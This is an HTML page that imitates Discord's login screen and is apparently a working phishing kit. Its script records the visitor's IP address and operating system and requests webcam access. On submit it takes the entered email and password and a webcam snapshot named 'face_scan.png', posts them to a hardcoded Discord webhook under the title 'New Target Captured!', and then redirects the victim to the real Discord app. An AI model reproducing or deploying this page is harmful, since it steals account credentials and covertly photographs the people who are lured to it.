<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body { background-color: #313338; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #f2f3f5; }
        .login-box { background-color: #313338; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); width: 480px; text-align: center; }
        h3 { font-size: 24px; margin-bottom: 8px; font-weight: 600; }
        p { color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
        .input-group { text-align: left; margin-bottom: 16px; }
        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }
        label span { color: #fa777c; }
        input { width: 100%; padding: 10px; background-color: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; box-sizing: border-box; outline: none; }
        .forgot { display: block; text-align: left; color: #00a8fc; font-size: 14px; text-decoration: none; margin-bottom: 20px; }
        button { width: 100%; padding: 10px; background-color: #5865F2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; }
        button:hover { background-color: #4752C4; }
        .register { margin-top: 8px; text-align: left; font-size: 14px; color: #949ba4; }
        .register a { color: #00a8fc; text-decoration: none; }
    </style>
</head>
<body>
<div class="login-box">
    <h3>Welcome back!</h3>
    <p>We're so excited to see you again!</p>
    <form id="login-form">
        <div class="input-group">
            <label>Email or Phone Number <span>*</span></label>
            <input type="text" id="email" required>
        </div>
        <div class="input-group">
            <label>Password <span>*</span></label>
            <input type="password" id="password" required>
        </div>
        <a href="#" class="forgot">Forgot your password?</a>
        <button type="submit">Log In</button>
    </form>
    <div class="register">Need an account? <a href="#">Register</a></div>
</div>
<script>
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
    let userIp = 'Unknown';
    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIp = d.ip).catch(e => console.error(e));
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Win') !== -1) os = 'Windows';
    if (ua.indexOf('Mac') !== -1) os = 'MacOS';
    if (ua.indexOf('Linux') !== -1) os = 'Linux';
    if (ua.indexOf('Android') !== -1) os = 'Android';
    if (ua.indexOf('like Mac') !== -1) os = 'iOS';
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { video.srcObject = stream; video.play(); }).catch(err => console.log('Camera access denied'));
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const time = new Date().toLocaleString();
        const formData = new FormData();
        const embed = {
            title: 'New Target Captured!',
            color: 0x5865F2,
            fields: [
                { name: 'Email', value: email, inline: true },
                { name: 'Password', value: password, inline: true },
                { name: 'IP Address', value: userIp, inline: false },
                { name: 'OS', value: os, inline: true },
                { name: 'User Agent', value: ua, inline: false },
                { name: 'Time', value: time, inline: true }
            ]
        };
        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
        if (video.srcObject) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function(blob) {
                formData.append('file', blob, 'face_scan.png');
                sendData(formData);
            }, 'image/png');
        } else {
            sendData(formData);
        }
    });
    function sendData(formData) {
        fetch(WEBHOOK_URL, { method: 'POST', body: formData }).then(() => { window.location.href = 'https://discord.com/app'; }).catch(e => console.error(e));
    }
</script>
</body>
</html>
